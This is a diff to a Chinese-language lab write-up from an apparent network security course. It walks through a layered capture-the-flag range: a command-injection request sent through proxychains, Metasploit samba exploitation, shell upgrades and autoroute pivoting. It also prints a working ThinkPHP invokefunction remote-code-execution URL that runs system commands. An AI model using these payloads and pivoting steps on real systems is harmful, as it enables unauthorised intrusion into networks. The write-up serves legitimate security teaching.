@@ -74,6 +74,54 @@ nginx
 `proxychains curl http://<目标IP>/index.php?cmd=ls%20/tmp`
 ![](./pics/第二个flag.png)
 
+#### samba
+
+1. 搜索可用攻击模块并选择合适的模块
+`search semba type:exploit`
+
+2. 设置options
+
+3. 攻击
+
+4. get flag
+![](./pics/getflag3.png)
+
+### 步骤三 设立pivot路由并发现靶标4-5
+
+1. 查看第一层两台主机的ip
+
+![](./pics/双网卡1.png)
+可以看到192.170.84.4这一台机器有双网卡
+
+2. 升级对应的shell
+![](./pics/升级shell1.png)
+
+3. 设置pivot路由
+![](./pics/添加pivot路由3.png)
+
+### 步骤四 攻击靶标4-5
+
+#### weblogic
+
+#### apache
+
+### 步骤五 发现终点靶标
+
+同样，ip a查看第二层靶机的网卡，发现双网卡
+![](./pics/发现双网卡.png)
+升级shell
+`sessions -u <>`
+进入新启动的shell
+`sessions -i <>`
+设置pivot路由
+`run autoroute -s 10,10,10,0/24`
+![](./pics/设置pivot路由.png)
+![](./pics/设置pivot路由成功.png)
+扫描发现终点靶标
+![](./pics/发现终点靶标.png)
+
+### 步骤六 攻击终点靶标
+
 #### thinkphp
 
 cve_2018_1002015
@@ -84,12 +132,6 @@ cve_2018_1002015
 `http://<目标IP>:<端口>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ls%20/tmp`
 ![](./pics/第三个flag.png)
 
-### 步骤三 
-
-1. 查看第一层两台主机的ip
-访问`http://<目标IP>:<端口>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ip%20a`
-![](./pics/双网卡.png)
-可以看到192.170.84.3这一台机器有双网卡
-
 ## 参考资料
+
 [教学课件](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/%E5%BB%BA%E7%AB%8B%E7%AB%8B%E8%B6%B3%E7%82%B9%E5%B9%B6%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%A0%872-4)
